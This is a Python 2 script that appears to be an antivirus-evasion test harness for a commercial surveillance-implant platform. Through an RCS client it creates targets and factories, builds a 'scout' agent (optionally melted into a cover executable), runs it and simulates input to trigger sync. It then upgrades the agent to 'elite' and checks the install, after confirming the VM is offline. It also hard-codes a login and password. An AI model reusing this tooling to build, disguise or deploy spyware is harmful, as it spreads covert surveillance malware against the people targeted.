import sys
from time import sleep
import time
import socket

import urllib2
import zipfile
import os.path

import subprocess
import Queue
import threading
import argparse
import random

from rcs_client import Rcs_client
import logger

def unzip(filename):
    zfile = zipfile.ZipFile(filename)
    names = []
    for name in zfile.namelist():
        (dirname, filename) = os.path.split(name)
        print "- Decompress: " + filename 
        zfile.extract(name)
        names.append(name)
    return names

def check_internet(address, queue):
    """ True if dns or http are reachable """
    print "- Check connection: %s" % address

    ret = False
    try:    
        #if hasattr(socket, 'setdefaulttimeout'):
        #    socket.setdefaulttimeout(5)
        response = socket.gethostbyaddr( address )
        #print "i resolve dns: ", address
        ret |= True
    except:
        ret |= False

    try:    
        if(ret == False):
            response = urllib2.urlopen('http://' + address, timeout = 10)
            #print "i reach url: ", address
            ret |= True
    except:
        ret |= False

    queue.put(ret)


def internet_on():
    ips = [ '87.248.112.181', '173.194.35.176', '176.32.98.166', 'www.reddit.com', 'www.bing.com', 'www.facebook.com','stackoverflow.com']
    q = Queue.Queue()
    for i in ips:
        t = threading.Thread(target = check_internet, args = (i, q) )
        t.daemon = True
        t.start()

    s = [ q.get() for i in ips ]
    return any(s)

def wait_timeout(proc, seconds):
    """Wait for a process to finish, or raise exception after timeout"""
    start = time.time()
    end = start + seconds
    interval = min(seconds / 1000.0, .25)

    print "DBG wait for: %s sec" % seconds
    while True:
        result = proc.poll()
        if result is not None:
            return result
        if time.time() >= end:
            proc.kill()
            print "DBG Process timed out, killed"
            break;
        time.sleep(interval)

class connection:
    host = ""
    user = "avmonitor"
    passwd = "avmonitorp123"

    def __enter__(self):
        print "DBG login"
        self.conn = Rcs_client(self.host, self.user, self.passwd)
        self.conn.login()
        return self.conn

    def __exit__(self, type, value, traceback):
        print "DBG logout"
        self.conn.logout()

class VMAVTest:
    
    def __init__(self, backend, frontend, kind):
        self.kind = kind
        self.host = (backend, frontend)

    def _delete_targets(self, operation):
        with connection() as c:
            operation_id = c.operation(operation)
            print "operation_id: %s" % operation_id
            targets = c.targets(operation_id)
            for t_id in targets:
                print "- Delete target: %s" % t_id
                c.target_delete(t_id) 

    def _create_new_factory(self, operation, target, factory, config):
        with connection() as c:
            operation_id = c.operation(operation)
            print "DBG operation: " , operation, " target: ", target, " factory: ", factory

            # gets all the target with our name in an operation
            targets = c.targets(operation_id, target)

            if len(targets) > 0:
                # keep only one target
                for t in targets[1:]:
                    c.target_delete(t)    

                target_id = targets[0]
                
                #print "target_id: ", target_id
                agents = c.agents( target_id )

                for agent_id, ident, name in agents:
                    print "DBG   ", agent_id, ident, name
                    if name.startswith(factory):
                        print "- Delete instance: %s %s" % (ident, name)
                        c.instance_delete(agent_id)
            else:
                print "- Create target: %s" % target
                target_id = c.target_create(operation_id, target, 'made by vmavtest at %s' % time.ctime())
            factory_id, ident = c.factory_create(operation_id, target_id, 'desktop', factory, 'made by vmavtestat at %s' % time.ctime())

            with open(config) as f:
                conf = f.read()
            conf = conf.replace('$(HOSTNAME)', self.host[1])
            c.factory_add_config(factory_id, conf)

            #print "open config to write"
            with open('build/config.actual.json','wb') as f:
                f.write(conf)

            #print "factory: ", factory
            return (target, factory_id, ident)

    def _build_agent(self, factory, melt = None, demo = False):
        with connection() as c:
            param = { 'platform': 'windows',
                  'binary': { 'demo' : demo, 'admin' : False},
                  'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
                  'sign' : {}
                  }

            #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
            try:
                
                filename = 'build/build.zip'
                if os.path.exists(filename):
                    os.remove(filename)

                if melt:
                    print "- Melt build with: ", melt
                    r = c.build_melt(factory, param, melt, filename)
                else:
                    print "- Silent build"
                    r = c.build(factory, param, filename)

                contentnames = unzip(filename)
                #print "contents: %s" % contentnames

                print "+ SUCCESS SCOUT BUILD"
                return [n for n in contentnames if n.endswith('.exe')]
            except Exception, e:
                print "+ FAILED SCOUT BUILD: "
                raise e
        
    def _execute_build(self, exenames):
        try:
            exe = exenames[0]
            print "- Execute: " + exe
            subp = subprocess.Popen([exe])
            print "+ SUCCESS SCOUT EXECUTE"
        except Exception, e:
            print "+ FAILED SCOUT EXECUTE"
            raise e

    def _trigger_sync(self, timeout=10):
        subp = subprocess.Popen(['assets/keyinject.exe'])
        wait_timeout(subp, timeout)

    def _check_instance(self, ident):
        with connection() as c:
            instances = c.instances( ident )
            print "DBG instances: %s" % instances

            assert len(instances) <= 1, "too many instances"

            if len(instances) > 0:
                print "+ SUCCESS SCOUT SYNC"
                return instances[0]
            else:
                print "+ FAILED SCOUT SYNC"
                return None

    def _check_elite(self, instance_id):
        with connection() as c:
            info = c.instance_info(instance_id)
            print 'DBG _check_elite %s' % info
            ret = info['upgradable'] == False and info['scout'] == False

            if ret:
                print "+ SUCCESS ELITE SYNC"
            else:
                print "+ FAILED ELITE SYNC"
            return ret

    def _uninstall(self, instance_id):
        with connection() as c:
            c.instance_close(instance_id)

    def _upgrade_elite(self, instance_id):
        with connection() as c:
            ret = c.instance_upgrade(instance_id)
            print "DBG _upgrade_elite: %s" % ret
            info = c.instance_info(instance_id)
            if ret:
                assert info['upgradable'] == True
                assert info['scout'] == True
            else:
                assert info['upgradable'] == False
                assert info['scout'] == True
            return ret

    def server_errors(self):
        with connection() as c:
            return c.server_status()['error']

    def execute_elite(self):
        """ build scout and upgrade it to elite """
        instance = self.execute_scout()

        if not instance:
            print "- exiting execute_elite because did't sync"
            return

        print "- Try upgrade to elite"
        upgradable = self._upgrade_elite(instance)
        if not upgradable:
            print "+ FAILED ELITE UPGRADE"
            return

        print "- Elite, Wait for 25 minutes: %s" % time.ctime() 
        sleep(25 * 60)
        
        elite = self._check_elite( instance )
        if elite:
            print "+ SUCCESS ELITE INSTALL"
            print "- Elite, wait for 2 minute then uninstall: %s" % time.ctime() 
            sleep(60 * 2)
            self._uninstall(instance)
            sleep(60 * 2)
            print "+ SUCCESS ELITE UNINSTALLED"
        else:
            print "+ FAILED ELITE INSTALL"

        print "- Result: %s" % elite


    def execute_scout(self):
        """ build and execute the  """
        hostname = socket.gethostname()
        print "- Host: %s %s\n" % (hostname, time.ctime())
        operation = 'AVMonitor'
        target = 'VM_%s' % hostname
        factory ='%s_%s' % (hostname, self.kind)
        config = "assets/config.json"

        if not os.path.exists('build'):
            os.mkdir('build')
        target_id, factory_id, ident = self._create_new_factory(operation, target, factory, config)

        meltfile = None
        if self.kind == 'melt':
            meltfile = 'assets/meltapp.exe'

        exe = self._build_agent( factory_id, meltfile )

        self._execute_build(exe)

        print "- Scout, Wait for 6 minutes: %s" % time.ctime() 
        sleep(random.randint(300, 400))

        print "- Scout, Trigger sync for 30 seconds"
        self._trigger_sync(timeout = 30)

        print "- Scout, wait for 1 minute: %s" % time.ctime() 
        sleep(60 * 1)

        instance = self._check_instance( ident )
        print "- Result: %s" % instance

        return instance

def internet(args):
    print time.ctime()
    print "internet on: ", internet_on()
    print time.ctime()

def clean(args):
    operation = 'AVMonitor'
    print "- Server: %s/%s %s" % (args.backend,args.frontend, args.kind)
    vmavtest = VMAVTest( args.backend, args.frontend , args.kind )
    vmavtest.delete_targets(operation)

def execute_agent(args, kind):
    """ starts a scout """
    if socket.gethostname() != 'zenovm':
        if internet_on():
            print "== ERROR: I reach Internet =="
            exit(0)

    print "- Network unreachable"

    print "- Server: %s/%s %s" % (args.backend,args.frontend, args.kind)
    vmavtest = VMAVTest( args.backend, args.frontend , args.kind )
    if not vmavtest.server_errors():
        print "+ SUCCESS SERVER CONNECT"
        action = {"elite": vmavtest.execute_elite, "scout": vmavtest.execute_scout}
        action[kind]()
    else:
        print "+ FAILED SERVER ERROR"

def elite(args):
    """ starts a scout """
    execute_agent(args, "elite")

def scout(args):
    """ starts a scout """
    execute_agent(args, "scout")

def test(args):
    ips = [ '87.248.112.181', '173.194.35.176', '176.32.98.166', 'www.reddit.com', 'www.bing.com', 'www.facebook.com']
    
    q = Queue.Queue()
    for i in ips:
        t = threading.Thread(target=check_internet, args=(i, q) )
        t.daemon = True
        t.start()

    s = [ q.get() for i in ips ]
    print s

    print "test mouse"
    sleep(10)
    subp = subprocess.Popen(['assets/keyinject.exe'])
    wait_timeout(subp, 3)
    print "stop mouse"
    

def main():
    logger.setLogger(debug=True)

    # scout -b 123 -f 123 -k silent/melt
    parser = argparse.ArgumentParser(description='AVMonitor avtest.')

    parser.add_argument('action', choices=['scout', 'elite', 'internet', 'test', 'clean']) #'elite'
    parser.add_argument('-b', '--backend')
    parser.add_argument('-f', '--frontend')
    parser.add_argument('-k', '--kind', choices=['silent', 'melt'])
    args = parser.parse_args()

    connection.host = args.backend
    actions = {'scout': scout, 'elite': elite, 'internet': internet, 'test': test, 'clean': clean}
    actions[args.action](args)
  

if __name__ == "__main__":
    main()
